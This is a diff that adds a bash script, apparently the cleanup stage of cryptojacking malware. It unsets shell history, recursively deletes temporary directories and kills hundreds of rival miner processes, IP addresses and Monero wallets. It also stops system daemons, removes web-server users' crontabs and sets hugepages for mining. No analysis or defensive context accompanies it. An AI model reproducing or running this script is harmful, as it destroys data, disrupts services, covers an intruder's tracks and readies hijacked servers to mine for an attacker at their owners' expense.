@@ -1,0 +1,423 @@
+#!/bin/bash -e
+rm -rf /tmp/.*
+killall -9 f
+unset HIST HISTFILE savehistory
+rm -rf /var/tmp/*
+rm -rf /tmp/*
+rm -rf /dev/shm*
+#touch /var/tmp/.do.jpg
+#touch /var/tmp/.VMX/.resyslogd
+#touch /var/tmp/.cron
+#chattr +ai /var/tmp/.do.jpg
+#chattr +ai /var/tmp/.VMX/.resyslogd
+#chattr +ai /var/tmp/.cron
+ps auxf|grep -v grep|grep "ld-linux-x86-64.so.2" | awk '{print $2}'|xargs kill -9 1>/dev/null 2>/dev/null
+ps auxf|grep -v grep|grep "DSST" | awk '{print $2}'|xargs kill -9 1>/dev/null 2>/dev/null
+ps auxf|grep -v grep|grep "DSSV" | awk '{print $2}'|xargs kill -9 1>/dev/null 2>/dev/null
+ps auxf|grep -v grep|grep "M29b8" | awk '{print $2}'|xargs kill -9 1>/dev/null 2>/dev/null
+ps auxf|grep -v grep|grep ".cron" | awk '{print $2}'|xargs kill -9 1>/dev/null 2>/dev/null
+ps auxf|grep -v grep|grep "apache.sh" | awk '{print $2}'|xargs kill -9 1>/dev/null 2>/dev/null
+ps auxf|grep -v grep|grep "nativesvc" | awk '{print $2}'|xargs kill -9 1>/dev/null 2>/dev/null
+ps auxf|grep -v grep|grep "initsvc" | awk '{print $2}'|xargs kill -9 1>/dev/null 2>/dev/null
+ps auxf|grep -v grep|grep "sourplum" | awk '{print $2}'|xargs kill -9 1>/dev/null 2>/dev/null
+ps auxf|grep -v grep|grep "monero"|awk '{print $2}'|xargs kill -9 1>/dev/null 2>/dev/null
+ps auxf|grep -v grep|grep "stratum"|awk '{print $2}'|xargs kill -9 1>/dev/null 2>/dev/null
+ps auxf|grep -v grep|grep "yam"|awk '{print $2}'|xargs kill -9 1>/dev/null 2>/dev/null
+ps auxf|grep -v grep|grep "xmr" | awk '{print $2}'|xargs kill -9 1>/dev/null 2>/dev/null
+ps auxf|grep -v grep|grep "xmrig" | awk '{print $2}'|xargs kill -9 1>/dev/null 2>/dev/null
+ps auxf|grep -v grep|grep "minergate" | awk '{print $2}'|xargs kill -9 1>/dev/null 2>/dev/null
+ps auxf|grep -v grep|grep "udevd" | awk '{print $2}'|xargs kill -9 1>/dev/null 2>/dev/null
+ps auxf|grep -v grep|grep "config.json" | awk '{print $2}'|xargs kill -9 1>/dev/null 2>/dev/null
+ps auxf|grep -v grep|grep "web-node" | awk '{print $2}'|xargs kill -9 1>/dev/null 2>/dev/null
+ps auxf|grep -v grep|grep "nttprd" | awk '{print $2}'|xargs kill -9 1>/dev/null 2>/dev/null
+ps auxf|grep -v grep|grep "logind.conf"|awk '{print $2}'|xargs kill -9
+ps auxf|grep -v grep|grep "kworker"|awk '{print $2}'|xargs kill -9
+ps auxf|grep -v grep|grep "stratum"|awk '{print $2}'|xargs kill -9
+ps auxf|grep -v grep|grep "cryptonight"|awk '{print $2}'|xargs kill -9
+ps auxf|grep -v grep|grep "xmrig"|awk '{print $2}'|xargs kill -9
+ps auxf|grep -v grep|grep "kworkep"|awk '{print $2}'|xargs kill -9
+ps auxf|grep -v grep|grep "mine.moneropool.com"|awk '{print $2}'|xargs kill -9
+ps auxf|grep -v grep|grep "crypto-pool"|awk '{print $2}'|xargs kill -9
+ps auxf|grep -v grep|grep "prohash"|awk '{print $2}'|xargs kill -9
+ps auxf|grep -v grep|grep "monerohash"|awk '{print $2}'|xargs kill -9
+ps auxf|grep -v grep|grep "monero"|awk '{print $2}'|xargs kill -9
+ps auxf|grep -v grep|grep "miner"|awk '{print $2}'|xargs kill -9
+ps auxf|grep -v grep|grep "nanopool"|awk '{print $2}'|xargs kill -9
+ps auxf|grep -v grep|grep "minergate"|awk '{print $2}'|xargs kill -9
+ps auxf|grep -v grep|grep "stak"|awk '{print $2}'|xargs kill -9
+ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:8080"|awk '{print $2}'|xargs kill -9
+ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:3333"|awk '{print $2}'|xargs kill -9
+ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:443"|awk '{print $2}'|xargs kill -9
+ps auxf|grep -v grep|grep "syslogs"|awk '{print $2}'|xargs kill -9
+ps auxf|grep -v grep|grep "./.syslogs"|awk '{print $2}'|xargs kill -9
+killall -9 -f "/tmp/systemd"
+killall -9 -f "/var/tmp/systemd"
+killall -9 suppoie
+killall -9 DSST
+killall -9 DSSV
+killall -9 M29b8
+killall -9 xmrigMiner
+killall -9 irqbalance
+killall -9 crypto-pool
+killall -9 XJnRj
+killall -9 NXLAi
+killall -9 BI5zj
+killall -9 askdljlqw
+killall -9 minerd
+killall -9 minergate
+killall -9 Guard.sh
+killall -9 ysaydh
+killall -9 bonns
+killall -9 donns
+killall -9 kxjd
+killall -9 stak
+killall -f sleep
+killall -f /tmp/m
+killall -f /tmp/.FILE/stak/ld-linux-x86-64.so.2
+killall -f /tmp/.FILE/stak
+killall -f JnKihGjn
+killall -f irqba2anc1
+killall -f irqba5xnc1
+killall -f conns
+killall -f irqbalance
+killall -f crypto-pool
+killall -f XJnRj
+killall -f NXLAi
+killall -f BI5zj
+killall -f askdljlqw
+killall -f minerd
+killall -f minergate
+killall -f Guard.sh
+killall -f ysaydh
+killall -f bonns
+killall -f donns
+killall -f kxjd
+killall -f 108.61.186.224
+killall -f Duck.sh
+killall -f bonn.sh
+killall -f conn.sh
+killall -f kworker34
+killall -f kw.sh
+killall -9 stak
+killall -f pro.sh
+killall -f polkitd
+killall -f acpid
+killall -f bb
+killall -9 atd
+killall -9 accounts-daemon
+killall -f 49hNrEaSKAx5FD8PE49Wa3DqCRp2ELYg8dSuqsiyLdzSehFfyvk4gDfSjTrPtGapqcfPVvMtAirgDJYMvbRJipaeTbzPQu4
+killall -f 4AniF816tMCNedhQ4J3ccJayyL5ZvgnqQ4X9bK7qv4ZG3QmUfB9tkHk7HyEhh5HW6hCMSw5vtMkj6jSYcuhQTAR1Sbo15gB
+killall -f 4813za7ePRV5TBce3NrSrugPPJTMFJmEMR9qiWn2Sx49JiZE14AmgRDXtvM1VFhqwG99Kcs9TfgzejAzT9Spm5ga5dkh8df
+killall -f 41e2vPcVux9NNeTfWe8TLK2UWxCXJvNyCQtNb69YEexdNs711jEaDRXWbwaVe4vUMveKAzAiA4j8xgUi29TpKXpm3zKTUYo
+killall -f 42X5Nwfs6kPcK5xZaV1mxnLpSqYst9d46Dx63tdtmHFZWdWPryNt5ZhZXFXLYm2yZLZt7xXC5zerGbqQi2X1MsTzA9whw2X
+killall -f cpuloadtest
+killall -f crypto-pool
+killall -f xmr
+killall -f prohash
+killall -f monero
+killall -f miner
+killall -f nanopool
+killall -f minergate
+killall -f seervceaess
+killall -9 142.4.124.164
+killall -9 192.99.56.117
+killall -9 jva
+killall -f ./sshd
+killall -f /tmp/wa/httpd.conf
+killall -f /tmp/systemd
+killall -f 108.61.186.224
+killall -f 128.199.86.57
+killall -f 142.4.124.164
+killall -f 192.99.56.117
+killall -f 45.76.102.45
+killall -f 5.196.23.240
+killall -f AnXqV.yam
+killall -f BI5zj
+killall -f Carbon
+killall -f Duck.sh
+killall -f Guard.sh
+killall -f JnKihGjn
+killall -f KGlJwfWDbCPnvwEJupeivI1FXsSptuyh
+killall -f NXLAi
+killall -f XJnRj
+killall -f accounts-daemon
+killall -f askdljlqw
+killall -f atd
+killall -f bonn.sh
+killall -f bonns
+killall -f carbon
+killall -f conn.sh
+killall -f conns
+killall -f crypto-pool
+killall -f ddg
+killall -f donns
+killall -f gekoCrw
+killall -f gekoCrw32
+killall -f gekoba2anc1
+killall -f gekoba5xnc1
+killall -f gekobalanc1
+killall -f gekobalance
+killall -f gekobalanq1
+killall -f gekobnc1
+killall -f ir29xc1
+killall -f irpbalanc1
+killall -f jIuc2ggfCAvYmluL2Jhc2gi
+killall -f jaav
+killall -f jva
+killall -f kw.sh
+killall -f kworker34
+killall -f kxjd
+killall -f lexarbalanc1
+killall -f lower.sh
+killall -f lowerv2.sh
+killall -f lowerv3.sh
+killall -f minerd
+killall -f minergate
+killall -f minergate-cli
+killall -f minexmr
+killall -f mixnerdx
+killall -f mule
+killall -f mutex
+killall -f myatd
+killall -f performedl
+killall -f polkitd
+killall -f pro.sh
+killall -f pubg
+killall -f pvv
+killall -f root.sh
+killall -f rootv2.sh
+killall -f rootv3.sh
+killall -f servcesa
+killall -f sleep
+killall -f sourplum
+killall -f stratum
+killall -f vsp
+killall -f watch-smart
+killall -f ysaydh
+killall -f acpid
+killall -9 ./sshd
+killall -9 /tmp/wa/httpd.conf
+killall -9 108.61.186.224
+killall -9 128.199.86.57
+killall -9 142.4.124.164
+killall -9 192.99.56.117
+killall -9 45.76.102.45
+killall -9 ./AnXqV.yam
+killall -9 ./BI5zj
+killall -9 ./Carbon
+killall -9 ./Duck.sh
+killall -9 ./Guard.sh
+killall -9 ./JnKihGjn
+killall -9 ./KGlJwfWDbCPnvwEJupeivI1FXsSptuyh
+killall -9 ./NXLAi
+killall -9 ./XJnRj
+killall -9 ./accounts-daemon
+killall -9 ./askdljlqw
+killall -9 ./atd
+killall -9 ./bonn.sh
+killall -9 ./bonns
+killall -9 ./carbon
+killall -9 ./conn.sh
+killall -9 ./conns
+killall -9 ./crypto-pool
+killall -9 ./ddg
+killall -9 ./donns
+killall -9 ./gekoCrw
+killall -9 ./gekoCrw32
+killall -9 ./gekoba2anc1
+killall -9 ./gekoba5xnc1
+killall -9 ./gekobalanc1
+killall -9 ./gekobalance
+killall -9 ./gekobalanq1
+killall -9 ./gekobnc1
+killall -9 ./ir29xc1
+killall -9 ./irpbalanc1
+killall -9 ./jIuc2ggfCAvYmluL2Jhc2gi
+killall -9 ./jaav
+killall -9 ./jva
+killall -9 ./kw.sh
+killall -9 ./kworker34
+killall -9 ./kxjd
+killall -9 ./lexarbalanc1
+killall -9 ./lower.sh
+killall -9 ./lowerv2.sh
+killall -9 ./lowerv3.sh
+killall -9 ./minerd
+killall -9 ./minergate
+killall -9 ./minergate-cli
+killall -9 ./minexmr
+killall -9 ./mixnerdx
+killall -9 ./mule
+killall -9 ./mutex
+killall -9 ./myatd
+killall -9 ./performedl
+killall -9 ./polkitd
+killall -9 ./pro.sh
+killall -9 ./pubg
+killall -9 ./pvv
+killall -9 ./root.sh
+killall -9 ./rootv2.sh
+killall -9 ./rootv3.sh
+killall -9 ./servcesa
+killall -9 ./sleep
+killall -9 ./sourplum
+killall -9 ./stratum
+killall -9 ./vsp
+killall -9 ./watch-smart
+killall -9 ./ysaydh
+killall -9 ./acpid
+killall -9 ./suppoie
+killall  ./sshd
+killall  /tmp/wa/httpd.conf
+killall  108.61.186.224
+killall  128.199.86.57
+killall  142.4.124.164
+killall  192.99.56.117
+killall  45.76.102.45
+killall  ./AnXqV.yam
+killall  ./BI5zj
+killall  ./Carbon
+killall  ./Duck.sh
+killall  ./Guard.sh
+killall  ./JnKihGjn
+killall  ./KGlJwfWDbCPnvwEJupeivI1FXsSptuyh
+killall  ./NXLAi
+killall  ./XJnRj
+killall  ./accounts-daemon
+killall  ./askdljlqw
+killall  ./atd
+killall  ./bonn.sh
+killall  ./bonns
+killall  ./carbon
+killall  ./conn.sh
+killall  ./conns
+killall  ./crypto-pool
+killall  ./ddg
+killall  ./donns
+killall  ./gekoCrw
+killall  ./gekoCrw32
+killall  ./gekoba2anc1
+killall  ./gekoba5xnc1
+killall  ./gekobalanc1
+killall  ./gekobalance
+killall  ./gekobalanq1
+killall  ./gekobnc1
+killall  ./ir29xc1
+killall  ./irpbalanc1
+killall  ./jIuc2ggfCAvYmluL2Jhc2gi
+killall  ./jaav
+killall  ./jva
+killall  ./kw.sh
+killall  ./kworker34
+killall  ./kxjd
+killall  ./lexarbalanc1
+killall  ./lower.sh
+killall  ./lowerv2.sh
+killall  ./lowerv3.sh
+killall  ./minerd
+killall  ./minergate
+killall  ./minergate-cli
+killall  ./minexmr
+killall  ./mixnerdx
+killall  ./mule
+killall  ./mutex
+killall  ./myatd
+killall  ./performedl
+killall  ./polkitd
+killall  ./pro.sh
+killall  ./pubg
+killall  ./pvv
+killall  ./root.sh
+killall  ./rootv2.sh
+killall  ./rootv3.sh
+killall  ./servcesa
+killall  ./sleep
+killall  ./sourplum
+killall  ./stratum
+killall  ./vsp
+killall  ./watch-smart
+killall  ./ysaydh
+killall  ./acpid
+killall -9 stratum
+killall -9 mixnerdx
+killall -9 performedl
+killall -9 sleep
+killall -9 /tmp/httpd.conf
+killall -9 JnKihGjn
+killall -9 irqba2anc1
+killall -9 irqba5xnc1
+killall -9 irqbnc1
+killall -9 ir29xc1
+killall -9 conns
+killall -9 irqbalance
+killall -9 crypto-pool
+killall -9 XJnRj
+killall -9 NXLAi
+killall -9 BI5zj
+killall -9 askdljlqw
+killall -9 minerd
+killall -9 minergate
+killall -9 Guard.sh
+killall -9 ysaydh
+killall -9 bonns
+killall -9 bonns
+killall -9 donns
+killall -9 kxjd
+killall -f sleep
+killall -f /tmp/m
+killall -f JnKihGjn
+killall -f irqba2anc1
+killall -f irqba5xnc1
+killall -f conns
+killall -f irqbalance
+killall -f crypto-pool
+killall -f XJnRj
+killall -f NXLAi
+killall -f BI5zj
+killall -f askdljlqw
+killall -f minerd
+killall -f minergate
+killall -f Guard.sh
+killall -f ysaydh
+killall -f bonns
+killall -f donns
+killall -f kxjd
+killall -f 108.61.186.224
+killall -f Duck.sh
+killall -f bonn.sh
+killall -f conn.sh
+killall -f kworker34
+killall -f kw.sh
+killall -f pro.sh
+killall -f polkitd
+killall -f acpid
+killall -f bb
+killall -9 atd
+killall -9 accounts-daemon
+killall -f yam
+#killall -9 perl
+killall -9 php
+killall -9 stak
+rm -rf /tmp/.*
+rm -rf /tmp/*
+rm -rf /var/tmp*
+rm -rf /var/tmp/.*
+rm -rf /dev/shm/*
+rm -rf /dev/shm/.*
+rm -rf /tmp/systemd
+rm -rf /var/tmp/sngd
+rm -rf /tmp/httpd.conf
+rm -rf /tmp/conn
+rm -rf /tmp/conns
+rm -rf /tmp/suppoie
+rm -rf /var/tmp/suppoie
+rm -rf /tmp/systemd
+rm -rf /var/tmp/systemd
+rm -f /tmp/irq.sh
+rm -f /tmp/irqbalanc1
+rm -f /tmp/irq
+crontab -u www-data -r
+crontab -u nginx -r
+crontab -u apache -r
+echo "vm.nr_hugepages=128" >> /etc/sysctl.conf
+sysctl -w vm.nr_hugepages=128
